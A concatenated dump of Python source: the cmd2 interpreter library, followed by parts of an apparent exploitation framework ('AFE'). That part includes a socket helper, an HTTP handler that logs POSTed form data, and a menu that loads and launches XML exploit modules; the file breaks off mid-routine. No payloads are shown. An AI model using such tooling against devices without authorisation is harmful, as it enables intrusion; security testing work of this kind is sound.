        self.multilineParser = (((self.multilineCommand ^ oneLineCommand) + SkipToLast(terminatorParser).setParseAction(lambda x: x[0].strip())('args') + terminatorParser)('statement') +
                                pyparsing.SkipTo(outputParser ^ pipe ^ stringEnd).setParseAction(lambda x: x[0].strip())('suffix') + afterElements)
        self.multilineParser.ignore(self.commentInProgress)
        self.singleLineParser = ((oneLineCommand + pyparsing.SkipTo(terminatorParser ^ stringEnd ^ pipe ^ outputParser).setParseAction(lambda x:x[0].strip())('args'))('statement') +
                                 pyparsing.Optional(terminatorParser) + afterElements)
        #self.multilineParser = self.multilineParser.setResultsName('multilineParser')
        #self.singleLineParser = self.singleLineParser.setResultsName('singleLineParser')
        self.blankLineTerminationParser = self.blankLineTerminationParser.setResultsName('statement')
        self.parser = self.prefixParser + (
            stringEnd |
            self.multilineParser |
            self.singleLineParser |
            self.blankLineTerminationParser | 
            self.multilineCommand + pyparsing.SkipTo(stringEnd)
            )
        self.parser.ignore(pyparsing.quotedString).ignore(self.commentGrammars)
        
        inputMark = pyparsing.Literal('<')
        inputMark.setParseAction(lambda x: '')
        fileName = pyparsing.Word(self.legalChars + '/\\')
        inputFrom = fileName('inputFrom')
        inputFrom.setParseAction(replace_with_file_contents)
        # a not-entirely-satisfactory way of distinguishing < as in "import from" from <
        # as in "lesser than"
        self.inputParser = inputMark + pyparsing.Optional(inputFrom) + pyparsing.Optional('>') + \
                           pyparsing.Optional(fileName) + (pyparsing.stringEnd | '|')
        self.inputParser.ignore(pyparsing.quotedString).ignore(self.commentGrammars).ignore(self.commentInProgress)               
    
    def preparse(self, raw, **kwargs):
        return raw
    def postparse(self, parseResult):
        return parseResult
   
    def parsed(self, raw, **kwargs):
        if isinstance(raw, ParsedString):
            p = raw
        else:
            # preparse is an overridable hook; default makes no changes
            s = self.preparse(raw, **kwargs)
            s = self.inputParser.transformString(s.lstrip())
            s = self.commentGrammars.transformString(s)
            for (shortcut, expansion) in self.shortcuts:
                if s.lower().startswith(shortcut):
                    s = s.replace(shortcut, expansion + ' ', 1)
                    break
            result = self.parser.parseString(s)
            result['raw'] = raw            
            result['command'] = result.multilineCommand or result.command        
            result = self.postparse(result)
            p = ParsedString(result.args)
            p.parsed = result
            p.parser = self.parsed
        for (key, val) in kwargs.items():
            p.parsed[key] = val
        return p
              
    def postparsing_precmd(self, statement):
        stop = 0
        return stop, statement
    def postparsing_postcmd(self, stop):
        return stop
    
    def func_named(self, arg):
        result = None
        target = 'do_' + arg
        if target in dir(self):
            result = target
        else:
            if self.abbrev:   # accept shortened versions of commands
                funcs = [fname for fname in self.keywords if fname.startswith(arg)]
                if len(funcs) == 1:
                    result = 'do_' + funcs[0]
        return result
    def onecmd_plus_hooks(self, line):
        stop = 0
        try:
            statement = self.complete_statement(line)
            (stop, statement) = self.postparsing_precmd(statement)
            if stop:
                return self.postparsing_postcmd(stop)
            if statement.parsed.command not in self.excludeFromHistory:
                self.history.append(statement.parsed.raw)      
            try:
                self.redirect_output(statement)
                timestart = datetime.datetime.now()
                statement = self.precmd(statement)
                stop = self.onecmd(statement)
                stop = self.postcmd(stop, statement)
                if self.timing:
                    self.pfeedback('Elapsed: %s' % str(datetime.datetime.now() - timestart))
            finally:
                self.restore_output(statement)
        except EmptyStatement:
            return 0
        except Exception, e:
            self.perror(str(e), statement)            
        finally:
            return self.postparsing_postcmd(stop)        
    def complete_statement(self, line):
        """Keep accepting lines of input until the command is complete."""
        if (not line) or (
            not pyparsing.Or(self.commentGrammars).
                setParseAction(lambda x: '').transformString(line)):
            raise EmptyStatement
        statement = self.parsed(line)
        while statement.parsed.multilineCommand and (statement.parsed.terminator == ''):
            statement = '%s\n%s' % (statement.parsed.raw, 
                                    self.pseudo_raw_input(self.continuation_prompt))                
            statement = self.parsed(statement)
        if not statement.parsed.command:
            raise EmptyStatement
        return statement
    
    def redirect_output(self, statement):
        if statement.parsed.pipeTo:
            self.kept_state = Statekeeper(self, ('stdout',))
            self.kept_sys = Statekeeper(sys, ('stdout',))
            self.redirect = subprocess.Popen(statement.parsed.pipeTo, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            sys.stdout = self.stdout = self.redirect.stdin
        elif statement.parsed.output:
            if (not statement.parsed.outputTo) and (not can_clip):
                self.perror('Cannot redirect to paste buffer; install ``xclip`` and re-run to enable')
                return
            self.kept_state = Statekeeper(self, ('stdout',))            
            self.kept_sys = Statekeeper(sys, ('stdout',))
            if statement.parsed.outputTo:
                mode = 'w'
                if statement.parsed.output == '>>':
                    mode = 'a'
                sys.stdout = self.stdout = open(os.path.expanduser(statement.parsed.outputTo), mode)                            
            else:
                sys.stdout = self.stdout = tempfile.TemporaryFile(mode="w+")
                if statement.parsed.output == '>>':
                    self.stdout.write(get_paste_buffer())
                    
    def restore_output(self, statement):
        if self.kept_state:
            if statement.parsed.output:
                if not statement.parsed.outputTo:
                    self.stdout.seek(0)
                    write_to_paste_buffer(self.stdout.read())
            elif statement.parsed.pipeTo:
                for result in self.redirect.communicate():              
                    self.kept_state.stdout.write(result or '')                        
            self.stdout.close()
            self.kept_state.restore()  
            self.kept_sys.restore()
            self.kept_state = None                        
                        
    def onecmd(self, line):
        """Interpret the argument as though it had been typed in response
        to the prompt.

        This may be overridden, but should not normally need to be;
        see the precmd() and postcmd() methods for useful execution hooks.
        The return value is a flag indicating whether interpretation of
        commands by the interpreter should stop.
        
        This (`cmd2`) version of `onecmd` already override's `cmd`'s `onecmd`.

        """
        statement = self.parsed(line)
        self.lastcmd = statement.parsed.raw   
        funcname = self.func_named(statement.parsed.command)
        if not funcname:
            return self._default(statement)
        try:
            func = getattr(self, funcname)
        except AttributeError:
            return self._default(statement)
        stop = func(statement) 
        return stop                
        
    def _default(self, statement):
        arg = statement.full_parsed_statement()
        if self.default_to_shell:
            result = os.system(arg)
            if not result:
                return self.postparsing_postcmd(None)
        return self.postparsing_postcmd(self.default(arg))

    def pseudo_raw_input(self, prompt):
        """copied from cmd's cmdloop; like raw_input, but accounts for changed stdin, stdout"""
        
        if self.use_rawinput:
            try:
                line = raw_input(prompt)
            except EOFError:
                line = 'EOF'
        else:
            self.stdout.write(prompt)
            self.stdout.flush()
            line = self.stdin.readline()
            if not len(line):
                line = 'EOF'
            else:
                if line[-1] == '\n': # this was always true in Cmd
                    line = line[:-1] 
        return line
    
    def _cmdloop(self, intro=None):
        """Repeatedly issue a prompt, accept input, parse an initial prefix
        off the received input, and dispatch to action methods, passing them
        the remainder of the line as argument.
        """

        # An almost perfect copy from Cmd; however, the pseudo_raw_input portion
        # has been split out so that it can be called separately
        
        self.preloop()
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                readline.parse_and_bind(self.completekey+": complete")
            except ImportError:
                pass
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro)+"\n")
            stop = None
            while not stop:
                if self.cmdqueue:
                    line = self.cmdqueue.pop(0)
                else:
                    line = self.pseudo_raw_input(self.prompt)
                if (self.echo) and (isinstance(self.stdin, file)):
                    self.stdout.write(line + '\n')
                stop = self.onecmd_plus_hooks(line)
            self.postloop()
        finally:
            if self.use_rawinput and self.completekey:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except ImportError:
                    pass    
            return stop

    def do_EOF(self, arg):
        return self._STOP_SCRIPT_NO_EXIT # End of script; should not exit app
    do_eof = do_EOF
                           
    def do_quit(self, arg):
        return self._STOP_AND_EXIT
    do_exit = do_quit
    do_q = do_quit
    
    def select(self, options, prompt='Your choice? '):
        '''Presents a numbered menu to the user.  Modelled after
           the bash shell's SELECT.  Returns the item chosen.
           
           Argument ``options`` can be:

             | a single string -> will be split into one-word options
             | a list of strings -> will be offered as options
             | a list of tuples -> interpreted as (value, text), so 
                                   that the return value can differ from
                                   the text advertised to the user '''
        if isinstance(options, basestring):
            options = zip(options.split(), options.split())
        fulloptions = []
        for opt in options:
            if isinstance(opt, basestring):
                fulloptions.append((opt, opt))
            else:
                try:
                    fulloptions.append((opt[0], opt[1]))
                except IndexError:
                    fulloptions.append((opt[0], opt[0]))
        for (idx, (value, text)) in enumerate(fulloptions):
            self.poutput('  %2d. %s\n' % (idx+1, text))
        while True:
            response = raw_input(prompt)
            try:
                response = int(response)
                result = fulloptions[response - 1][0]
                break
            except ValueError:
                pass # loop and ask again
        return result
    
    @options([make_option('-l', '--long', action="store_true",
                 help="describe function of parameter")])    
    def do_show(self, arg, opts):
        '''Shows value of a parameter.'''
        param = arg.strip().lower()
        result = {}
        maxlen = 0
        for p in self.settable:
            if (not param) or p.startswith(param):
                result[p] = '%s: %s' % (p, str(getattr(self, p)))
                maxlen = max(maxlen, len(result[p]))
        if result:
            for p in sorted(result):
                if opts.long:
                    self.poutput('%s # %s' % (result[p].ljust(maxlen), self.settable[p]))
                else:
                    self.poutput(result[p])
        else:
            self.perror("Parameter '%s' not supported (type 'show' for list of parameters)." % param)
    
    def do_set(self, arg):
        '''
        Sets a cmd2 parameter.  Accepts abbreviated parameter names so long
        as there is no ambiguity.  Call without arguments for a list of 
        settable parameters with their values.'''
        try:
            statement, paramName, val = arg.parsed.raw.split(None, 2)
            val = val.strip()
            paramName = paramName.strip().lower()
            if paramName not in self.settable:
                hits = [p for p in self.settable if p.startswith(paramName)]
                if len(hits) == 1:
                    paramName = hits[0]
                else:
                    return self.do_show(paramName)
            currentVal = getattr(self, paramName)
            if (val[0] == val[-1]) and val[0] in ("'", '"'):
                val = val[1:-1]
            else:                
                val = cast(currentVal, val)
            setattr(self, paramName, val)
            self.stdout.write('%s - was: %s\nnow: %s\n' % (paramName, currentVal, val))
            if currentVal != val:
                try:
                    onchange_hook = getattr(self, '_onchange_%s' % paramName)
                    onchange_hook(old=currentVal, new=val)
                except AttributeError:
                    pass
        except (ValueError, AttributeError, NotSettableError), e:
            self.do_show(arg)
                
    def do_pause(self, arg):
        'Displays the specified text then waits for the user to press RETURN.'
        raw_input(arg + '\n')
        
    def do_shell(self, arg):
        'execute a command as if at the OS prompt.'
        os.system(arg)
                
    def do_py(self, arg):  
        '''
        py <command>: Executes a Python command.
        py: Enters interactive Python mode.
        End with ``Ctrl-D`` (Unix) / ``Ctrl-Z`` (Windows), ``quit()``, '`exit()``.
        Non-python commands can be issued with ``cmd("your command")``.
        Run python code from external files with ``run("filename.py")``
        '''
        self.pystate['self'] = self
        arg = arg.parsed.raw[2:].strip()
        localvars = (self.locals_in_py and self.pystate) or {}
        interp = InteractiveConsole(locals=localvars)
        interp.runcode('import sys, os;sys.path.insert(0, os.getcwd())')
        if arg.strip():
            interp.runcode(arg)
        else:
            def quit():
                raise EmbeddedConsoleExit
            def onecmd_plus_hooks(arg):
                return self.onecmd_plus_hooks(arg + '\n')
            def run(arg):
                try:
                    file = open(arg)
                    interp.runcode(file.read())
                    file.close()
                except IOError, e:
                    self.perror(e)
            self.pystate['quit'] = quit
            self.pystate['exit'] = quit
            self.pystate['cmd'] = onecmd_plus_hooks
            self.pystate['run'] = run
            try:
                cprt = 'Type "help", "copyright", "credits" or "license" for more information.'        
                keepstate = Statekeeper(sys, ('stdin','stdout'))
                sys.stdout = self.stdout
                sys.stdin = self.stdin
                interp.interact(banner= "Python %s on %s\n%s\n(%s)\n%s" %
                       (sys.version, sys.platform, cprt, self.__class__.__name__, self.do_py.__doc__))
            except EmbeddedConsoleExit:
                pass
            keepstate.restore()
            
    def do_history(self, arg):
        """history [arg]: lists past commands issued
        
        | no arg:         list all
        | arg is integer: list one history item, by index
        | arg is string:  string search
        | arg is /enclosed in forward-slashes/: regular expression search
        """
        if arg:
            history = self.history.get(arg)
        else:
            history = self.history
        for hi in history:
            self.stdout.write(hi.pr())
    def last_matching(self, arg):
        try:
            if arg:
                return self.history.get(arg)[-1]
            else:
                return self.history[-1]
        except IndexError:
            return None        
    def do_list(self, arg):
        """list [arg]: lists last command issued
        
        no arg -> list most recent command
        arg is integer -> list one history item, by index
        a..b, a:b, a:, ..b -> list spans from a (or start) to b (or end)
        arg is string -> list all commands matching string search
        arg is /enclosed in forward-slashes/ -> regular expression search
        """
        try:
            history = self.history.span(arg or '-1')
        except IndexError:
            history = self.history.search(arg)
        for hi in history:
            self.poutput(hi.pr())

    do_hi = do_history
    do_l = do_list
    do_li = do_list
        
    def do_ed(self, arg):
        """ed: edit most recent command in text editor
        ed [N]: edit numbered command from history
        ed [filename]: edit specified file name
        
        commands are run after editor is closed.
        "set edit (program-name)" or set  EDITOR environment variable
        to control which editing program is used."""
        if not self.editor:
            self.perror("Please use 'set editor' to specify your text editing program of choice.")
            return
        filename = self.default_file_name
        if arg:
            try:
                buffer = self.last_matching(int(arg))
            except ValueError:
                filename = arg
                buffer = ''
        else:
            buffer = self.history[-1]

        if buffer:
            f = open(os.path.expanduser(filename), 'w')
            f.write(buffer or '')
            f.close()        
                
        os.system('%s %s' % (self.editor, filename))
        self.do__load(filename)
    do_edit = do_ed
    
    saveparser = (pyparsing.Optional(pyparsing.Word(pyparsing.nums)^'*')("idx") + 
                  pyparsing.Optional(pyparsing.Word(legalChars + '/\\'))("fname") +
                  pyparsing.stringEnd)    
    def do_save(self, arg):
        """`save [N] [filename.ext]`

        Saves command from history to file.

        | N => Number of command (from history), or `*`; 
        |      most recent command if omitted"""

        try:
            args = self.saveparser.parseString(arg)
        except pyparsing.ParseException:
            self.perror(self.do_save.__doc__)
            return
        fname = args.fname or self.default_file_name
        if args.idx == '*':
            saveme = '\n\n'.join(self.history[:])
        elif args.idx:
            saveme = self.history[int(args.idx)-1]
        else:
            saveme = self.history[-1]
        try:
            f = open(os.path.expanduser(fname), 'w')
            f.write(saveme)
            f.close()
            self.pfeedback('Saved to %s' % (fname))
        except Exception, e:
            self.perror('Error saving %s: %s' % (fname, str(e)))
            
    def read_file_or_url(self, fname):
        # TODO: not working on localhost
        if isinstance(fname, file):
            result = open(fname, 'r')
        else:
            match = self.urlre.match(fname)
            if match:
                result = urllib.urlopen(match.group(1))
            else:
                fname = os.path.expanduser(fname)
                try:
                    result = open(os.path.expanduser(fname), 'r')
                except IOError:                    
                    result = open('%s.%s' % (os.path.expanduser(fname), 
                                             self.defaultExtension), 'r')
        return result
        
    def do__relative_load(self, arg=None):
        '''
        Runs commands in script at file or URL; if this is called from within an
        already-running script, the filename will be interpreted relative to the 
        already-running script's directory.'''
        if arg:
            arg = arg.split(None, 1)
            targetname, args = arg[0], (arg[1:] or [''])[0]
            targetname = os.path.join(self.current_script_dir or '', targetname)
            self.do__load('%s %s' % (targetname, args))
    
    urlre = re.compile('(https?://[-\\w\\./]+)')
    def do_load(self, arg=None):           
        """Runs script of command(s) from a file or URL."""
        if arg is None:
            targetname = self.default_file_name
        else:
            arg = arg.split(None, 1)
            targetname, args = arg[0], (arg[1:] or [''])[0].strip()
        try:
            target = self.read_file_or_url(targetname)
        except IOError, e:
            self.perror('Problem accessing script from %s: \n%s' % (targetname, e))
            return
        keepstate = Statekeeper(self, ('stdin','use_rawinput','prompt',
                                       'continuation_prompt','current_script_dir'))
        self.stdin = target    
        self.use_rawinput = False
        self.prompt = self.continuation_prompt = ''
        self.current_script_dir = os.path.split(targetname)[0]
        stop = self._cmdloop()
        self.stdin.close()
        keepstate.restore()
        self.lastcmd = ''
        return stop and (stop != self._STOP_SCRIPT_NO_EXIT)    
    do__load = do_load  # avoid an unfortunate legacy use of do_load from sqlpython
    
    def do_run(self, arg):
        """run [arg]: re-runs an earlier command
        
        no arg -> run most recent command
        arg is integer -> run one history item, by index
        arg is string -> run most recent command by string search
        arg is /enclosed in forward-slashes/ -> run most recent by regex
        """        
        'run [N]: runs the SQL that was run N commands ago'
        runme = self.last_matching(arg)
        self.pfeedback(runme)
        if runme:
            stop = self.onecmd_plus_hooks(runme)
    do_r = do_run        
            
    def fileimport(self, statement, source):
        try:
            f = open(os.path.expanduser(source))
        except IOError:
            self.stdout.write("Couldn't read from file %s\n" % source)
            return ''
        data = f.read()
        f.close()
        return data

    def runTranscriptTests(self, callargs):
        class TestMyAppCase(Cmd2TestCase):
            CmdApp = self.__class__        
        self.__class__.testfiles = callargs
        sys.argv = [sys.argv[0]] # the --test argument upsets unittest.main()
        testcase = TestMyAppCase()
        runner = unittest.TextTestRunner()
        result = runner.run(testcase)
        result.printErrors()

    def run_commands_at_invocation(self, callargs):
        for initial_command in callargs:
            if self.onecmd_plus_hooks(initial_command + '\n'):
                return self._STOP_AND_EXIT

    def cmdloop(self):
        parser = optparse.OptionParser()
        parser.add_option('-t', '--test', dest='test',
               action="store_true", 
               help='Test against transcript(s) in FILE (wildcards OK)')
        (callopts, callargs) = parser.parse_args()
        if callopts.test:
            self.runTranscriptTests(callargs)
        else:
            if not self.run_commands_at_invocation(callargs):
                self._cmdloop()   
            
class HistoryItem(str):
    listformat = '-------------------------[%d]\n%s\n'
    def __init__(self, instr):
        str.__init__(self)
        self.lowercase = self.lower()
        self.idx = None
    def pr(self):
        return self.listformat % (self.idx, str(self))
        
class History(list):
    '''A list of HistoryItems that knows how to respond to user requests.
    >>> h = History([HistoryItem('first'), HistoryItem('second'), HistoryItem('third'), HistoryItem('fourth')])
    >>> h.span('-2..')
    ['third', 'fourth']
    >>> h.span('2..3')
    ['second', 'third']
    >>> h.span('3')
    ['third']    
    >>> h.span(':')
    ['first', 'second', 'third', 'fourth']
    >>> h.span('2..')
    ['second', 'third', 'fourth']
    >>> h.span('-1')
    ['fourth']    
    >>> h.span('-2..-3')
    ['third', 'second']      
    >>> h.search('o')
    ['second', 'fourth']
    >>> h.search('/IR/')
    ['first', 'third']
    '''
    def zero_based_index(self, onebased):
        result = onebased
        if result > 0:
            result -= 1
        return result
    def to_index(self, raw):
        if raw:
            result = self.zero_based_index(int(raw))
        else:
            result = None
        return result
    def search(self, target):
        target = target.strip()
        if target[0] == target[-1] == '/' and len(target) > 1:
            target = target[1:-1]
        else:
            target = re.escape(target)
        pattern = re.compile(target, re.IGNORECASE)
        return [s for s in self if pattern.search(s)]
    spanpattern = re.compile(r'^\s*(?P<start>\-?\d+)?\s*(?P<separator>:|(\.{2,}))?\s*(?P<end>\-?\d+)?\s*$')
    def span(self, raw):
        if raw.lower() in ('*', '-', 'all'):
            raw = ':'
        results = self.spanpattern.search(raw)
        if not results:
            raise IndexError
        if not results.group('separator'):
            return [self[self.to_index(results.group('start'))]]
        start = self.to_index(results.group('start'))
        end = self.to_index(results.group('end'))
        reverse = False
        if end is not None:
            if end < start:
                (start, end) = (end, start)
                reverse = True
            end += 1
        result = self[start:end]
        if reverse:
            result.reverse()
        return result
                
    rangePattern = re.compile(r'^\s*(?P<start>[\d]+)?\s*\-\s*(?P<end>[\d]+)?\s*$')
    def append(self, new):
        new = HistoryItem(new)
        list.append(self, new)
        new.idx = len(self)
    def extend(self, new):
        for n in new:
            self.append(n)
        
    def get(self, getme=None, fromEnd=False):
        if not getme:
            return self
        try:
            getme = int(getme)
            if getme < 0:
                return self[:(-1 * getme)]
            else:
                return [self[getme-1]]
        except IndexError:
            return []
        except ValueError:
            rangeResult = self.rangePattern.search(getme)
            if rangeResult:
                start = rangeResult.group('start') or None
                end = rangeResult.group('start') or None
                if start:
                    start = int(start) - 1
                if end:
                    end = int(end)
                return self[start:end]
                
            getme = getme.strip()

            if getme.startswith(r'/') and getme.endswith(r'/'):
                finder = re.compile(getme[1:-1], re.DOTALL | re.MULTILINE | re.IGNORECASE)
                def isin(hi):
                    return finder.search(hi)
            else:
                def isin(hi):
                    return (getme.lower() in hi.lowercase)
            return [itm for itm in self if isin(itm)]

class NotSettableError(Exception):
    pass
        
def cast(current, new):
    """Tries to force a new value into the same type as the current."""
    typ = type(current)
    if typ == bool:
        try:
            return bool(int(new))
        except (ValueError, TypeError):
            pass
        try:
            new = new.lower()    
        except:
            pass
        if (new=='on') or (new[0] in ('y','t')):
            return True
        if (new=='off') or (new[0] in ('n','f')):
            return False
    else:
        try:
            return typ(new)
        except:
            pass
    print ("Problem setting parameter (now %s) to %s; incorrect type?" % (current, new))
    return current
        
class Statekeeper(object):
    def __init__(self, obj, attribs):
        self.obj = obj
        self.attribs = attribs
        if self.obj:
            self.save()
    def save(self):
        for attrib in self.attribs:
            setattr(self, attrib, getattr(self.obj, attrib))
    def restore(self):
        if self.obj:
            for attrib in self.attribs:
                setattr(self.obj, attrib, getattr(self, attrib))        

class Borg(object):
    '''All instances of any Borg subclass will share state.
    from Python Cookbook, 2nd Ed., recipe 6.16'''
    _shared_state = {}
    def __new__(cls, *a, **k):
        obj = object.__new__(cls, *a, **k)
        obj.__dict__ = cls._shared_state
        return obj
    
class OutputTrap(Borg):
    '''Instantiate  an OutputTrap to divert/capture ALL stdout output.  For use in unit testing.
    Call `tearDown()` to return to normal output.'''
    def __init__(self):
        self.contents = ''
        self.old_stdout = sys.stdout
        sys.stdout = self
    def write(self, txt):
        self.contents += txt
    def read(self):
        result = self.contents
        self.contents = ''
        return result
    def tearDown(self):
        sys.stdout = self.old_stdout
        self.contents = ''
        
class Cmd2TestCase(unittest.TestCase):
    '''Subclass this, setting CmdApp, to make a unittest.TestCase class
       that will execute the commands in a transcript file and expect the results shown.
       See example.py'''
    CmdApp = None
    def fetchTranscripts(self):
        self.transcripts = {}
        for fileset in self.CmdApp.testfiles:
            for fname in glob.glob(fileset):
                tfile = open(fname)
                self.transcripts[fname] = iter(tfile.readlines())
                tfile.close()
        if not len(self.transcripts):
            raise (StandardError,), "No test files found - nothing to test."
    def setUp(self):
        if self.CmdApp:
            self.outputTrap = OutputTrap()
            self.cmdapp = self.CmdApp()
            self.fetchTranscripts()
    def runTest(self): # was testall
        if self.CmdApp:
            its = sorted(self.transcripts.items())
            for (fname, transcript) in its:
                self._test_transcript(fname, transcript)
    regexPattern = pyparsing.QuotedString(quoteChar=r'/', escChar='\\', multiline=True, unquoteResults=True)
    regexPattern.ignore(pyparsing.cStyleComment)
    notRegexPattern = pyparsing.Word(pyparsing.printables)
    notRegexPattern.setParseAction(lambda t: re.escape(t[0]))
    expectationParser = regexPattern | notRegexPattern
    anyWhitespace = re.compile(r'\s', re.DOTALL | re.MULTILINE)
    def _test_transcript(self, fname, transcript):
        lineNum = 0
        finished = False
        line = transcript.next()
        lineNum += 1
        tests_run = 0
        while not finished:
            # Scroll forward to where actual commands begin
            while not line.startswith(self.cmdapp.prompt):
                try:
                    line = transcript.next()
                except StopIteration:
                    finished = True
                    break
                lineNum += 1
            command = [line[len(self.cmdapp.prompt):]]
            line = transcript.next()
            # Read the entirety of a multi-line command
            while line.startswith(self.cmdapp.continuation_prompt):
                command.append(line[len(self.cmdapp.continuation_prompt):])
                try:
                    line = transcript.next()
                except StopIteration:
                    raise (StopIteration, 
                           'Transcript broke off while reading command beginning at line %d with\n%s' 
                           % (command[0]))
                lineNum += 1
            command = ''.join(command)               
            # Send the command into the application and capture the resulting output
            stop = self.cmdapp.onecmd_plus_hooks(command)
            #TODO: should act on ``stop``
            result = self.outputTrap.read()
            # Read the expected result from transcript
            if line.startswith(self.cmdapp.prompt):
                message = '\nFile %s, line %d\nCommand was:\n%s\nExpected: (nothing)\nGot:\n%s\n'%\
                    (fname, lineNum, command, result)     
                self.assert_(not(result.strip()), message)
                continue
            expected = []
            while not line.startswith(self.cmdapp.prompt):
                expected.append(line)
                try:
                    line = transcript.next()
                except StopIteration:
                    finished = True                       
                    break
                lineNum += 1
            expected = ''.join(expected)
            # Compare actual result to expected
            message = '\nFile %s, line %d\nCommand was:\n%s\nExpected:\n%s\nGot:\n%s\n'%\
                (fname, lineNum, command, expected, result)      
            expected = self.expectationParser.transformString(expected)
            # checking whitespace is a pain - let's skip it
            expected = self.anyWhitespace.sub('', expected)
            result = self.anyWhitespace.sub('', result)
            self.assert_(re.match(expected, result, re.MULTILINE | re.DOTALL), message)

    def tearDown(self):
        if self.CmdApp:
            self.outputTrap.tearDown()

if __name__ == '__main__':
    doctest.testmod(optionflags = doctest.NORMALIZE_WHITESPACE)
        
'''
To make your application transcript-testable, replace 

::

  app = MyApp()
  app.cmdloop()
  
with

::

  app = MyApp()
  cmd2.run(app)
  
Then run a session of your application and paste the entire screen contents
into a file, ``transcript.test``, and invoke the test like::

  python myapp.py --test transcript.test

Wildcards can be used to test against multiple transcript files.
'''



########NEW FILE########
__FILENAME__ = common
#!/usr/bin/env python
# encoding: utf-8
"""
common.py
"""

#AFE Version
version = "2.0"

import SimpleHTTPServer, time, SocketServer, logging, cgi, os, cmd, socket, sys, urllib2

class COLOR:
    WHITE = '\033[37m'
    GRAY = '\033[30m'
    BLUE = '\033[34m'
    GREEN = '\033[92m'
    YELLOW = '\033[33m'
    RED = '\033[91m'
    ENDC = '\033[1;m'

class Server:
    """Server class"""

    def __init__(self, ip, port, direction):
        self.ip = ip
        self.port = port
        self.direction = direction
        self.socketConn = None

    def __del__(self):
        try:
            self.socketConn.close()
        except Exception:
            pass

    def connectSocket(self):
        try:
            self.socketConn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socketConn.connect((self.ip, self.port))
            return True
        except socket.error:
            return False

    def sendData(self, data):
        self.connectSocket()
        self.socketConn.sendall(data)

    def receiveData(self):
        return self.socketConn.recv(4096)

    def closeSocket(self):
        self.socketConn.close()
        self.socketConn = None


class Logger(object):
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.log = open(filename, "a")

    def __del__(self):
	self.log.close()

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)


class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    def do_GET(self):
        print self.headers
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        print self.headers
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        for item in form.list:
            print item
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

########NEW FILE########
__FILENAME__ = exploit
#!/usr/bin/env python
# encoding: utf-8
import os, os.path, sys, argparse, shlex, signal, subprocess, xml.dom.minidom, time
from basecmd import *
from subprocess import call
import menu
from xml.dom.minidom import parseString, getDOMImplementation

def getText(nodelist):
    rc = []
    for node in nodelist:
        if node.nodeType == node.TEXT_NODE:
            rc.append(node.data)
    return ''.join(rc)

class Exploit(object):

    def __init__(self):
        """ Arbitary constructor """
        self.path = "miscellaneous"

    def execute(self, session, arg):
        """ Arbitary function """

class Exploits(BaseCmd):

    def __init__(self, conn, session):
        BaseCmd.__init__(self, session)
        self.connected = conn
        self.session = session
        if (self.connected == 1):
            self.prompt = "*Afe/menu/exploit$ "
            self.isconn = True
        else:
            self.prompt = "Afe/menu/exploit$ "
            self.isconn = False
        self.exploits = {} # list of modules 
        self.do_reload(None)
    
    def do_back(self, _args):
        """
Return to main menu
        """
        return -1

    def _find_exploits(self):
	    exploit_dir = os.getcwd() + "/exploits"
	    dir_list = [d for d in os.listdir(exploit_dir) if d.endswith(".xml")]
	    return dir_list
	
    def _list_exploits(self, dir_list):
	    self.exploits = dir_list
		
	
    def do_list(self, _args):
	    """
List all available modules
	    """
	    for exploit in sorted(self.exploits):
		    print exploit
		
    def do_reload(self, _args):
	    """
Reloads the Plugins which are loaded in the memory
	    """
	    exploitnames = self._find_exploits()
	    self._list_exploits(exploitnames)

    def preexec_function():
        signal.signal(signal.SIGINT, signal.SIG_IGN)

    def preexec():
	    os.setpgrp()

    def do_sploit(self, args):
        """
Run a custom module
usage: sploit [--arg <arg>] exploitname.xml
        """

        # Define command-line arguments using argparse
        parser = argparse.ArgumentParser(prog = 'sploit', add_help = False)
        parser.add_argument('exploit')
        parser.add_argument('--arg', '-a', metavar = '<arg>')
        try:
            splitargs = parser.parse_args(shlex.split(args))
            self.exploits.index(splitargs.exploit)
        except ValueError:
	        pass
	        print splitargs.exploit
	        print "Error : Module not Found, please Reload"
        except:
                pass
        else:
	        if os.name == 'nt':
	            os.system('cls')
	        else:
	            os.system('clear')
	        exploit_file = os.getcwd() + "/exploits/" + splitargs.exploit
	        file = open(exploit_file,'r')
	        data = file.read()
	        file.close()
	        dom = parseString(data)
	        if (len(dom.getElementsByTagName('author'))!=0):
	            xmlTag = dom.getElementsByTagName('author')[0].toxml()
	            author = xmlTag.replace('<author>','').replace('</author>','')
	        else:
	            author = "Unknown"
	        if (len(dom.getElementsByTagName('description'))!=0):
	            xmlTag = dom.getElementsByTagName('description')[0].toxml()
	            desc = xmlTag.replace('<description>','').replace('</description>','')
	        else:
	            desc = "Unknown"
	        if (len(dom.getElementsByTagName('date'))!=0):
	            xmlTag = dom.getElementsByTagName('date')[0].toxml()
	            sdate = xmlTag.replace('<date>','').replace('</date>','')
	        else:
	            sdate = "Unknown"
	        if (len(dom.getElementsByTagName('name'))!=0):
	            xmlTag = dom.getElementsByTagName('name')[0].toxml()
	            appname = xmlTag.replace('<name>','').replace('</name>','')
	        else:
	            print "<name></name> doesnot exist !"
	            return
	        if (len(dom.getElementsByTagName('connected'))!=0):
	            xmlTag = dom.getElementsByTagName('connected')[0].toxml()
	            if xmlTag == "<connected/>":
	                sconn = "0"
	            else:
	                sconn = xmlTag.replace('<connected>','').replace('</connected>','')
	        else:
	            sconn = "1"
	        print "Exploit made by : " + author
	        print "Description : " + desc
	        print "App Name : " + appname
	        print "Exploit built on: " + sdate
	        print "------------------------------------------"
	        print "Exploiting !!"
	        print "Checking if device needs to be connected !"
	        if (self.isconn == True):
	            self.isconn == True
	            self.connected = 1
	            self.prompt = "*Afe/menu/exploit$ "
	        else:
	            self.isconn == False
	            self.connected = 0
	            self.prompt = "Afe/menu/exploit$ "
	        if sconn == "1" and self.isconn == False:
	            print "Exiting: ERROR - AFE Agent is not connected but it is required !"
